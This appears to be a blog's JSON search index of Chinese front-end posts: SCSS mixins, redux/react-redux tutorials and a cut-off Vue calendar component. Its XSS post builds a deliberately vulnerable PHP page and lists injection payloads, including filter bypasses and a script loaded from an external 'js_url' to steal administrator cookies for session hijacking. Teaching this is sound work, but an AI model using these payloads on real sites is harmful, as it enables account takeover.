$prefix-for-microsoft == true &#123; -ms-#&#123;$property&#125;: $value; &#125; @else if $prefix == o and $prefix-for-opera == true &#123; -o-#&#123;$property&#125;: $value; &#125; @else if $prefix == spec and $prefix-for-spec == true &#123; #&#123;$property&#125;: $value; &#125; @else &#123; @warn \"Unrecognized prefix: #&#123;$prefix&#125;\"; &#125; &#125;&#125; 定义transition 12345678910111213141516171819//5.定义transform//示例: @include prefixer(border-radius, $radius, webkit spec);//Transform, transform-origin, transform-style//----------------------------------------@mixin transform($property...) &#123; @include prefixer(transform, $property, webkit moz o ms spec);&#125;@mixin transform-origin($axes: 50%) &#123; // x-axis - left | center | right | length | % // y-axis - top | center | bottom | length | % // z-axis - length @include prefixer(transform-origin, $axes, webkit moz o ms spec);&#125;@mixin skewX($degrees) &#123; @include prefixer(transform, skewX($degrees), webkit moz o ms spec); -webkit-backface-visibility: hidden;&#125; 定义fit-content 1234567891011121314151617181920212223242526272829//6.定义transition// Return vendor-prefixed property names if appropriate// Example: transition-property-names((transform, color, background), moz) -&gt; -moz-transform, color, background//----------------------------------------@function transition-property-names($props, $vendor: false) &#123; $new-props: (); @each $prop in $props &#123; $new-props: append($new-props, transition-property-name($prop, $vendor), comma); &#125; @return $new-props;&#125;@function transition-property-name($prop, $vendor: false) &#123; // put other properties that need to be prefixed here aswell @if $vendor and $prop == transform &#123; @return unquote('-'+$vendor+'-'+$prop); &#125; @else &#123; @return $prop; &#125;&#125;// transition//----------------------------------------@mixin transition ($properties...) &#123; @if length($properties) &gt;= 1 &#123; @include prefixer(transition, $properties, webkit moz o ms spec); &#125; @else &#123; $properties: all 0.15s ease-out 0; @include prefixer(transition, $properties, webkit moz o ms spec); &#125;&#125; 定义fit-content 12345678//7.定义fit-content@mixin fit-content &#123; width: -webkit-fit-content; width: -moz-fit-content; width: -o-fit-content; width: -ms-fit-content; width: fit-content;&#125; 定义box-shadow 12345//8.设置box-shadow// box-shadow@mixin box-shadow($shadow...) &#123; @include prefixer(box-shadow, $shadow, webkit spec);&#125; 定义文本 123456789101112//9.设置文本%typography &#123; color: $color; text: &#123; decoration: none; align: center; &#125; font: &#123; family: $fontFamily; size: $fontSize; &#125;&#125; 具体样式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394959697// 10.具体样式.menu &#123; width: $width; @extend %clearfix;//调用清除浮动 @extend %listStyle;//调用清除列表样式 @include fit-content; margin: 50px auto;&#125;.drop-menu &#123; @extend %listStyle;//调用清除列表样式&#125;.menu &gt; li &#123; background: $bgColor; float: left; position: relative; @include skewX(25deg);&#125;.menu a &#123; display: block; @extend %typography;&#125;.menu li:hover &#123; background: $sfbgColor;&#125;.menu &gt; li &gt; a &#123; padding: 1em 2em; @include skewX(-25deg);&#125;/*Dropdown menu*/.drop-menu &#123; position: absolute; width: $width / 4; left: 50%; margin-left: -($width / 8); opacity: 0; visibility: hidden; @include skewX(-25deg); @include transform-origin(left top); li &#123; background-color: $bgColor; position: relative; overflow: hidden; opacity: 0; visibility: hidden; @include transition(all .2s ease ); a &#123; padding: 1em 2em; &#125; &amp;::after &#123; content: \"\"; position: absolute; top: -125%; height: 100%; width: 100%; @include box-shadow(0 0 50px rgba(0,0,0,.9)); &#125; &amp;:nth-child(odd) &#123; @include transform(skewX(-25deg) translateX(0)); a &#123; @include skewX(25deg); &#125; &amp;::after &#123; right: -50%; @include transform(skewX(-25deg) rotate(3deg)); &#125; &#125; &amp;:nth-child(even)&#123; @include transform(skewX(25deg) translateX(0)); a &#123; @include skewX(-25deg); &#125; &amp;::after &#123; left: -50%; @include transform(skewX(25deg) rotate(3deg)); &#125; &#125; &#125;&#125;.menu &gt; li:hover .drop-menu,.menu &gt; li:hover .drop-menu li &#123; opacity: 1; visibility: visible;&#125;.menu &gt; li:hover .drop-menu li:nth-child(even)&#123; @include transform(skewX(25deg) translateX(15px));&#125;.menu &gt; li:hover .drop-menu li:nth-child(odd)&#123; @include transform(skewX(-25deg) translateX(-15px));&#125; 阅读 Sass中文网 SASS基础教程——SASS基本语法与特性 sass揭秘之变量 理解SASS的嵌套，@extend，%Placeholders和Mixins 在线编辑SCSS工具：sassmeister sass揭秘之@if，@for，@each（转载）","categories":[{"name":"CSS","slug":"CSS","permalink":"http://yoursite.com/categories/CSS/"}],"tags":[{"name":"SCSS","slug":"SCSS","permalink":"http://yoursite.com/tags/SCSS/"}]},{"title":"XXS攻击","slug":"XSS攻击","date":"2020-03-04T06:58:20.000Z","updated":"2020-06-22T10:05:06.380Z","comments":true,"path":"posts/12cd2a8e.html","link":"","permalink":"http://yoursite.com/posts/12cd2a8e.html","excerpt":"","text":"XXS攻击参看： XSS的原理分析与解剖 前端安全 – XSS攻击 web大前端开发中一些常见的安全性问题 前言XSS 是面试时，hr提出来给我的，然后大体的浏览一遍，今天才查阅资料大体了解了它。 XSS 攻击：攻击者向HTML页面传入恶意的HTML或JS代码，当用户浏览该页面时，恶意代码执行，达到攻击的目的。 原理实现在本地搭建PHP环境（使用phpstudy安装），然后在index.php文件中输入一下代码： 1234567891011121314151617181920&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input&quot;&gt; &lt;input type=&quot;submit&quot;&gt;&lt;/form&gt;&lt;hr&gt;&lt;?php header(&quot;X-XSS-Protection: 0&quot;); // 0： 表示关闭浏览器的XSS防护机制 error_reporting(0); // 加上error_reporting(0);就不会弹出警告了 $xss = $_GET[&apos;xss_input&apos;]; echo &apos;&lt;h5&gt;你输入的字符为&lt;/h5&gt;&lt;br /&gt;&apos;.$xss;?&gt;&lt;/body&gt;&lt;/html&gt; 现在在输入框中输入abc普通字符串，然后在页面中显示： 之后查看页面代码，就会发现页面上多了一行代码： 123456789101112131415&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"\" method=\"get\"&gt; &lt;input type=\"text\" name=\"xss_input\"&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;hr&gt; /*------多了的代码：123-------*/&lt;h5&gt;你输入的字符为&lt;/h5&gt;&lt;br /&gt;123&lt;/body&gt;&lt;/html&gt; 此时，我要是在输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;这种可以被解析的代码时： 现在页面就显现出xss漏洞了。 之后查看页面代码，就会发现页面上多了一行代码： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" /&gt; &lt;title&gt;XSS原理重现&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=\"\" method=\"get\"&gt; &lt;input type=\"text\" name=\"xss_input\"&gt; &lt;input type=\"submit\"&gt;&lt;/form&gt;&lt;hr&gt;/*------多了的代码：&lt;script&gt;alert('xss')&lt;/script&gt;-------*/// 代码出现在 br标签 和 body标签中&lt;h5&gt;你输入的字符为&lt;/h5&gt;&lt;br /&gt;&lt;script&gt;alert('xss')&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; xss利用输出环境来构造代码现在我要改变 xss 攻击： 以上测试是在，标签中插入scrpit标签达到攻击的目的；现在我想要在html页面标签的属性中插入xss攻击代码。因此，当你我输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，不会显示出弹框了。 测试代码1234567891011121314151617181920212223242526272829303132&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt; &lt;title&gt;XSS利用输出的环境来构造代码&lt;/title&gt;&lt;/head&gt;&lt;body&gt; &lt;center&gt; &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; &lt;form action=&quot;&quot; method=&quot;get&quot;&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type=&quot;text&quot; name=&quot;xss_input_value&quot; value=&quot;输入&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot;&gt; &lt;/form&gt; &lt;hr&gt; &lt;?php header(&quot;X-XSS-Protection: 0&quot;); error_reporting(0);//加上error_reporting(0);就不会弹出警告了 $xss = $_GET[&apos;xss_input_value&apos;]; if(isset($xss))&#123; echo &apos;&lt;input type=&quot;text&quot; value=&quot;&apos;.$xss.&apos;&quot;&gt;&apos;; &#125;else&#123; echo &apos;&lt;input type=&quot;type&quot; value=&quot;输出&quot;&gt;&apos;; &#125; ?&gt; &lt;/center&gt;&lt;/body&gt;&lt;/html&gt; 页面效果： 输入一当我在输入框输入qwer字符串时，会在输出框显示我输入的字符串： 此时网页代码： 123456789&lt;center&gt; &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; &lt;form action=\"\" method=\"get\"&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type=\"text\" name=\"xss_input_value\" value=\"输入\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;hr&gt; &lt;input type=\"text\" value=\"qwer\"&gt; &lt;/center&gt; 输入二现在我输入&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;，字符串正常输入，明显的可以看到，并没有弹出对话框： 此时网页代码： 1234567891011&lt;body&gt; &lt;center&gt; &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; &lt;form action=\"\" method=\"get\"&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type=\"text\" name=\"xss_input_value\" value=\"输入\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;hr&gt; &lt;input type=\"text\" value=\"&lt;script&gt;alert('xss')&lt;/script&gt;\"&gt; &lt;/center&gt;&lt;/body&gt; 分析输出代码： 1&lt;input type=\"text\" value=\"&lt;script&gt;alert('xss')&lt;/script&gt;\"&gt; &lt;/center&gt; 输入三如果我输入&quot;&gt;，就会变成： 1&lt;input type=\"text\" value=\"\"&gt; \"&gt; &lt;/center&gt; input提前闭合了！之后的&quot;&gt;就被舍弃了，变成了普通文本。 输入四如果我输入：&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt; 显示效果： 输入五现在我不想显示弹框攻击了，我想触发某种事件实现攻击，那么就输入以下内容： 1\" onmousemove=\"alert('我就测试一下')\" 显示结果： 页面代码： 123456789&lt;center&gt; &lt;h6&gt;把我们输入的字符串 输出到input里的value属性里&lt;/h6&gt; &lt;form action=\"\" method=\"get\"&gt; &lt;h6&gt;请输入你想显现的字符串&lt;/h6&gt; &lt;input type=\"text\" name=\"xss_input_value\" value=\"输入\"&gt;&lt;br&gt; &lt;input type=\"submit\"&gt; &lt;/form&gt; &lt;hr&gt; &lt;input type=\"text\" value=\"\" onmousemove=\"alert('我就测试一下')\"\"&gt; &lt;/center&gt; 说明：输入以后，鼠标在移动是触发事件，形成xss攻击。 那么，我在 标签中显示呢？ 此时就这样输入： 1&lt;/textarea&gt; &lt;script&gt;alert(‘xss’)&lt;/script&gt; // 就可以实现弹窗了 过滤的解决办法假如说网站禁止过滤了script 这时该怎么办呢 ？ 那么就需要记住：只要页面能触发你的js代码 有哪些方法呢？ 123456789101112&lt;!-- 当找不到图片名为1的文件时，执行alert('xss') --&gt;&lt;img scr=1 onerror=alert('xss')&gt; &lt;!-- 点击s时运行alert('xss') --&gt;&lt;a href=javascrip:alert('xss')&gt;s&lt;/a&gt; &lt;!-- 利用iframe的scr来弹窗 --&gt;&lt;iframe src=javascript:alert('xss');height=0 width=0 /&gt;&lt;iframe&gt; &lt;!-- 过滤了alert来执行弹窗 --&gt;&lt;img src=\"1\" onerror=eval(\"\\x61\\x6c\\x65\\x72\\x74\\x28\\x27\\x78\\x73\\x73\\x27\\x29\")&gt;&lt;/img&gt; xss的利用123&lt;script scr=\"js_url\"&gt;&lt;/script&gt;&lt;img src=x onerror=appendChild(createElement('script')).src='js_url' /&gt; 比如我们在网站的留言区输入&lt;script scr=”js_url”&gt;&lt;/script&gt; 当管理员进后台浏览留言的时候，就会触发 然后管理员的cookies和后台地址还有管理员浏览器版本等等 你都可以获取到了，再用“桂林老兵cookie欺骗工具”来更改你的cookies， 就可以不用输入账号 密码 验证码 就可以以管理员的方式来进行登录了。","categories":[{"name":"JavasCript","slug":"JavasCript","permalink":"http://yoursite.com/categories/JavasCript/"}],"tags":[{"name":"JavasCript","slug":"JavasCript","permalink":"http://yoursite.com/tags/JavasCript/"}]},{"title":"redux","slug":"redux","date":"2020-02-18T09:44:20.000Z","updated":"2020-06-18T07:09:21.436Z","comments":true,"path":"posts/a8054c2.html","link":"","permalink":"http://yoursite.com/posts/a8054c2.html","excerpt":"","text":"redux作用：集中式管理 react 应用中多个组件共享的状态。 核心apicreateStore()作用：创建包含指定 reducer 的 store 对象 123import &#123;createStore&#125; from 'redux'import reducer from './reducer'const store = createStore(reducer) store作用：redux 库最核心的管理对象 它内部维护着：state 和 reducer 核心方法：getState()、dispatch(action)、subscribe(listener) 编码： 123store.getState()store.dispatch(&#123;type:'INCREMENT', number&#125;)store.subscribe(render) applyMiddleware()作用：应用上基于 redux 的中间件(插件库) 编码： 123456import &#123;createStore, applyMiddleware&#125; from 'redux'import thunk from 'redux-thunk' // redux 异步中间件const store = createStore( counter, applyMiddleware(thunk) // 应用上异步中间件) combineReducers()作用：合并多个 reducer 函数 编码： 12345export default combineReducers(&#123; user, chatUser, chat&#125;) redux 的三个核心概念action作用：标识要执行行为的对象 包含2个方面的属性 type：标识属性, 值为字符串, 唯一, 必要属性 XXX：数据属性，值类型任意，可选属性 例子： 1234const action = &#123; type: 'INCREMENT', data: 2&#125; Action Creator(创建 Action 的工厂函数) 1const increment = (number) =&gt; (&#123;type: 'INCREMENT', data: number&#125;) reducer作用：根据老的 state 和 action, 产生新的 state 的纯函数 样例： 12345678910export default function counter(state = 0, action) &#123; switch (action.type) &#123; case 'INCREMENT': return state + action.data case 'DECREMENT': return state - action.data default: return state &#125;&#125; 注意：返回一个新的状态，不要修改原来的状态 store将 state,action 与 reducer 联系在一起的对象 123import &#123;createStore&#125; from 'redux'import reducer from './reducer'const store = createStore(reducer) 此对象的功能： getState(): 得到 state dispatch(action): 分发 action, 触发 reducer 调用, 产生新的 state subscribe(listener): 注册监听, 当产生了新的 state 时, 自动调用 count计数案例###react实现计数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758import React, &#123; Component &#125; from 'react'export default class App extends Component &#123; state = &#123; count: 0 // 定义变量 &#125; constructor(props) &#123; super(props) // 创建ref，将其赋值给一个变量，通过ref挂载在dom节点或组件上，该ref的current属性将能拿到dom节点或组件的实例 this.numberRef = React.createRef() &#125; increment = () =&gt; &#123; // 同步加 const number = this.numberRef.current.value * 1 this.setState(state =&gt; (&#123; count: state.count + number &#125;)) &#125; decrement = () =&gt; &#123; // 同步减 const number = this.numberRef.current.value * 1 this.setState(state =&gt; (&#123; count: state.count - number &#125;)) &#125; incrementIfOdd = () =&gt; &#123; // 奇数加 const number = this.numberRef.current.value * 1 if (this.state.count % 2 === 1) &#123; this.setState(state =&gt; (&#123; count: state.count + number &#125;)) &#125; &#125; incrementAsync = () =&gt; &#123; // 异步加 const number = this.numberRef.current.value * 1 setTimeout(() =&gt; &#123; this.setState(state =&gt; (&#123; count: state.count + number &#125;)) &#125;, 1000) &#125; render() &#123; const count = this.state.count return ( &lt;div&gt; &lt;p&gt;click &#123;count&#125; times&lt;/p&gt; &lt;div&gt; &lt;select ref=&#123;this.numberRef&#125;&gt; &lt;option value=\"1\"&gt;1&lt;/option&gt; &lt;option value=\"2\"&gt;2&lt;/option&gt; &lt;option value=\"3\"&gt;3&lt;/option&gt; &lt;/select&gt;&#123;' '&#125; &amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;increment if odd&lt;/button&gt; &amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; ) &#125;&#125; react_redux版本 实现思路： 1234567891011121314// index.jsimport React from 'react'import ReactDOM from 'react-dom'import App from './App'import store from './redux/store'ReactDOM.render(&lt;App store=&#123;store&#125;/&gt;, document.getElementById('root'))// 给store绑定状态更新的监听store.subscribe(() =&gt; &#123; // store内部的状态数据发生改变时回调 // 重新渲染App组件标签 ReactDOM.render(&lt;App store=&#123;store&#125;/&gt;, document.getElementById('root'))&#125;) 123456// redux/store.js// redux最核心的管理对象: storeimport &#123;createStore&#125; from 'redux'import reducer from './reducer'export default createStore(reducer) // 创建store对象内部会第一次调用reducer()得到初始状态值 1234567891011121314151617// redux/reducer.js// reducer函数模块: 根据当前state和指定action返回一个新的stateimport &#123; INCREMENT, DECREMENT &#125; from './action-types'// 管理count状态数据的reducerexport default function count(state = 1, action) &#123; console.log('count()', state, action) switch (action.type) &#123; case INCREMENT: return state + action.data case DECREMENT: return state - action.data default: return state &#125;&#125; 12345// redux/action-types.js// 包含n个action type常量名称的模块export const INCREMENT = 'increment'export const DECREMENT = 'decrement' 12345678910111213// redux/action.js// 包含n个用来创建action的工厂函数(action creator)import &#123; INCREMENT, DECREMENT &#125; from './action-types'/*增加的action */export const increment = number =&gt; (&#123; type: INCREMENT, data: number &#125;)/*减少的action */export const decrement = number =&gt; (&#123; type: DECREMENT, data: number &#125;) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// App.jsximport React, &#123;Component&#125; from 'react'import PropTypes from 'prop-types'// 引入 actions，在store.dispatch()触发更新import &#123;increment, decrement&#125; from './redux/actions'export default class App extends Component &#123; static propTypes = &#123; store: PropTypes.object.isRequired &#125; constructor(props) &#123; super(props) this.numberRef = React.createRef() &#125; increment = () =&gt; &#123; const number = this.numberRef.current.value * 1 this.props.store.dispatch(increment(number)) &#125; decrement = () =&gt; &#123; const number = this.numberRef.current.value * 1 this.props.store.dispatch(decrement(number)) &#125; incrementIfOdd = () =&gt; &#123; const number = this.numberRef.current.value * 1 if (this.props.store.getState() % 2 === 1) &#123; this.props.store.dispatch(increment(number)) &#125; &#125; incrementAsync = () =&gt; &#123; const number = this.numberRef.current.value * 1 setTimeout(() =&gt; &#123; this.props.store.dispatch(increment(number)) &#125;, 1000) &#125; render() &#123; const count = this.props.store.getState() return ( &lt;div&gt; &lt;p&gt;click &#123;count&#125; times&lt;/p&gt; &lt;div&gt; &lt;select ref=&#123;this.numberRef&#125;&gt; &lt;option value=\"1\"&gt;1&lt;/option&gt; &lt;option value=\"2\"&gt;2&lt;/option&gt; &lt;option value=\"3\"&gt;3&lt;/option&gt; &lt;/select&gt; &amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;increment if odd&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; ) &#125;&#125; 缺点： 1) redux 与 react 组件的代码耦合度太高 2) 编码不够简洁 react-redux库一个 react 插件库，专门用来简化 react 应用中使用 redux。 React-Redux 将所有组件分成两大类： UI 组件a. 只负责 UI 的呈现，不带有任何业务逻辑b. 通过 props 接收数据(一般数据和函数)c. 不使用任何 Redux 的 APId. 一般保存在 components 文件夹下 容器组件a. 负责管理数据和业务逻辑，不负责 UI 的呈现b. 使用 Redux 的 APIc. 一般保存在 containers 文件夹下 相关apiProvider： 1234// 让所有组件都可以得到 state 数据&lt;Provider store=&#123;store&#125;&gt; &lt;App /&gt;&lt;/Provider&gt; connect()： 12345// 用于包装 UI 组件生成容器组件connect( mapStateToprops, mapDispatchToProps)(Counter) mapStateToprops() 123456// 函数: 将 state 数据转换为 UI 组件的标签属性function mapStateToProps (state) &#123; return &#123; count: state &#125;&#125; mapDispatchToProps： 123456789101112// 函数: 将分发 action 的函数转换为 UI 组件的标签属性function mapDispatchToProps(dispatch) &#123; return &#123; increment: (number) =&gt; dispatch(increment(number)), decrement: (number) =&gt; dispatch(decrement(number)), &#125;&#125;// 对象: 简洁语法, 可以直接指定包含多个 action 方法const mapDispatchToProps = &#123; increment, decrement&#125; react-redux版本123456npm install --save react-reduxredux/action-types.js 不变redux/actions.js 不变redux/reducers.js 不变redux/store.js 不变 1234567891011121314151617181920212223242526// containers/App.jsimport &#123;connect&#125; from 'react-redux'import Counter from '../components/Counter'import &#123;increment, decrement&#125; from '../redux/actions'/*// 指定向Counter传入哪些一般属性(属性值的来源就是store中的state)const mapStateToProps = (state) =&gt; (&#123;count: state&#125;)// 指定向Counter传入哪些函数属性// 如果是函数, 会自动调用得到对象, 将对象中的方法作为函数属性传入UI组件const mapDispatchToProps = (dispatch) =&gt; (&#123; increment: (number) =&gt; dispatch(increment(number)), decrement: (number) =&gt; dispatch(decrement(number)),&#125;)// 如果是对象, 将对象中的方法包装成一个新函数, 并传入UI组件// const mapDispatchToProps = &#123;increment, decrement&#125;export default connect( mapStateToProps, mapDispatchToProps)(Counter)*/export default connect( state =&gt; (&#123;count: state&#125;), &#123;increment, decrement&#125;,)(Counter) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// components/Counter.jsximport React, &#123;Component&#125; from 'react'import PropTypes from 'prop-types'/*UI组件 主要做显示与与用户交互 代码中没有任何redux相关的代码 */export default class Counter extends Component &#123; static propTypes = &#123; count: PropTypes.number.isRequired, increment: PropTypes.func.isRequired, decrement: PropTypes.func.isRequired &#125; constructor(props) &#123; super(props) this.numberRef = React.createRef() &#125; increment = () =&gt; &#123; const number = this.numberRef.current.value * 1 this.props.increment(number) &#125; decrement = () =&gt; &#123; const number = this.numberRef.current.value * 1 this.props.decrement(number) &#125; incrementIfOdd = () =&gt; &#123; const number = this.numberRef.current.value * 1 if (this.props.count % 2 === 1) &#123; this.props.increment(number) &#125; &#125; incrementAsync = () =&gt; &#123; const number = this.numberRef.current.value * 1 setTimeout(() =&gt; &#123; this.props.increment(number) &#125;, 1000) &#125; render() &#123; const count = this.props.count return ( &lt;div&gt; &lt;p&gt;click &#123;count&#125; times&lt;/p&gt; &lt;div&gt; &lt;select ref=&#123;this.numberRef&#125;&gt; &lt;option value=\"1\"&gt;1&lt;/option&gt; &lt;option value=\"2\"&gt;2&lt;/option&gt; &lt;option value=\"3\"&gt;3&lt;/option&gt; &lt;/select&gt; &amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;increment if odd&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; ) &#125;&#125; 12345678910// 入口jsimport React from 'react'import ReactDOM from 'react-dom'import &#123; Provider &#125; from 'react-redux'import App from './containers/App'import store from './redux/store'ReactDOM.render(&lt;Provider store=&#123;store&#125;&gt; &lt;App/&gt;&lt;/Provider&gt;, document.getElementById('root')) redux-thunk异步中间件npm install --save redux-thunk 123456// redux/store.jsimport &#123;createStore, applyMiddleware&#125; from 'redux'import thunk from 'redux-thunk' // 引入依赖import reducer from './reducer'export default createStore(reducer, applyMiddleware(thunk)) 1234567891011121314// redux/actions.js/* 异步增加的异步 action */export const incrementAsync = function(number) &#123; // 返回一个带 dispatch 参数的函数 return dispatch =&gt; &#123; // 执行异步操作 setTimeout(() =&gt; &#123; // 有了结果后, 通过同步的increment分发 action dispatch(increment(number)) &#125;, 1000) &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566// components/Counter.jsximport React, &#123;Component&#125; from 'react'import PropTypes from 'prop-types'/*UI组件 主要做显示与与用户交互 代码中没有任何redux相关的代码 */export default class Counter extends Component &#123; static propTypes = &#123; count: PropTypes.number.isRequired, increment: PropTypes.func.isRequired, decrement: PropTypes.func.isRequired, incrementAsync: PropTypes.func.isRequired // 引入异步方法 &#125; constructor(props) &#123; super(props) this.numberRef = React.createRef() &#125; increment = () =&gt; &#123; const number = this.numberRef.current.value * 1 this.props.increment(number) &#125; decrement = () =&gt; &#123; const number = this.numberRef.current.value * 1 this.props.decrement(number) &#125; incrementIfOdd = () =&gt; &#123; const number = this.numberRef.current.value * 1 if (this.props.count % 2 === 1) &#123; this.props.increment(number) &#125; &#125; incrementAsync = () =&gt; &#123; const number = this.numberRef.current.value * 1 // 使用 thunk 异步增加 this.props.incrementAsync(number) &#125; render() &#123; const count = this.props.count return ( &lt;div&gt; &lt;p&gt;click &#123;count&#125; times&lt;/p&gt; &lt;div&gt; &lt;select ref=&#123;this.numberRef&#125;&gt; &lt;option value=\"1\"&gt;1&lt;/option&gt; &lt;option value=\"2\"&gt;2&lt;/option&gt; &lt;option value=\"3\"&gt;3&lt;/option&gt; &lt;/select&gt; &amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.increment&#125;&gt;+&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.decrement&#125;&gt;-&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.incrementIfOdd&#125;&gt;increment if odd&lt;/button&gt;&amp;nbsp;&amp;nbsp; &lt;button onClick=&#123;this.incrementAsync&#125;&gt;increment async&lt;/button&gt; &lt;/div&gt; &lt;/div&gt; ) &#125;&#125; 12345678910// containers/App.jsximport &#123;connect&#125; from 'react-redux'import Counter from '../components/Counter'// 将 incrementAsync 挂载到 Counterimport &#123;increment, decrement, incrementAsync&#125; from '../redux/actions'export default connect( state =&gt; (&#123;count: state&#125;), &#123;increment, decrement, incrementAsync&#125;,)(Counter) redux 调试工具在chrome安装redux-devtool插件 项目中下载依赖：npm install --save-dev redux-devtools-extension 12345678// // redux/store.jsimport &#123;createStore, applyMiddleware&#125; from 'redux'// 引入这个工具import &#123;composeWithDevTools&#125; from 'redux-devtools-extension'import thunk from 'redux-thunk'import reducer from './reducer'export default createStore(reducer, composeWithDevTools(applyMiddleware(thunk)))","categories":[{"name":"reactjs","slug":"reactjs","permalink":"http://yoursite.com/categories/reactjs/"}],"tags":[{"name":"reactjs","slug":"reactjs","permalink":"http://yoursite.com/tags/reactjs/"}]},{"title":"日历组件","slug":"封装日历组件","date":"2019-06-06T16:23:20.000Z","updated":"2020-06-18T07:09:21.438Z","comments":true,"path":"posts/3b43e344.html","link":"","permalink":"http://yoursite.com/posts/3b43e344.html","excerpt":"","text":"日历组件效果 忙活了大概三天，做出来非常开心，心里美滋滋的 其实很早就想自己写一个日历组件了，只怪自己懒散 现在写一下思路过程，记录一下 需求1、实现一个日历组件，如图： 2、显示某天的事项： 3、事项是模拟父组件请求接口返回的，数据格式如下： 12345678910111213141516171819202122[ &#123; id: '232', date: '2019-06-01', info: '我要去吃大餐' &#125;, &#123; id: '292', date: '2019-06-06', info: '我要去吃大餐' &#125;, &#123; id: '292', date: '2019-06-07', info: '我要去吃大餐' &#125;, &#123; id: '369', date: '2019-06-30', info: '我要去吃大餐' &#125; ] 4、把事项添加到日历组件中，数据格式如下： 代码解析package.json文件： 父组件页面： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101&lt;template&gt; &lt;div class=\"test-container\"&gt; &lt;h1&gt;Test页面，测试组件&lt;/h1&gt; &lt;!-- 日历 --&gt; &lt;calendar v-if=\"calendarVisible\" @getDateInfo=\"getDateInfo\" :propsInfoList=\"propsInfoList\" :propsTime=\"propsTime\"&gt;&lt;/calendar&gt; &lt;/div&gt;&lt;/template&gt;&lt;script&gt;import calendar from '@/components/Calendar/Calendar.vue'export default &#123; name: 'test', components: &#123; \"calendar\": calendar &#125;, data() &#123; return &#123; calendarVisible: true, propsTime: '', propsInfoList: '', middle: [ &#123; id: '232', date: '2019-06-01', info: '我要去吃大餐' &#125;, &#123; id: '292', date: '2019-06-06', info: '我要去吃大餐' &#125;, &#123; id: '292', date: '2019-06-07', info: '我要去吃大餐' &#125;, &#123; id: '369', date: '2019-06-30', info: '我要去吃大餐' &#125; ] &#125; &#125;, created() &#123; // 模拟首屏ajax请求，将当月数据传入组件中 this.propsInfoList = JSON.stringify(this.middle) this.propsTime = this.getToday() &#125;, mounted() &#123; window.alert('测试时间为19年 5、6、7月，完成是在6月') &#125;, methods: &#123; // 格式化当前日期 YYYY-MM-DD getToday() &#123; let nowDate = new Date() let yy = nowDate.getFullYear().toString() let mm = (nowDate.getMonth() + 1 + '').padStart(2,'0') let dd = (nowDate.getDate() + '').padStart(2,'0') // let hh = nowDate.getHours().toString().padStart(2,'0') // let mt = (nowDate.getMinutes() + '').padStart(2,'0') // let ss = 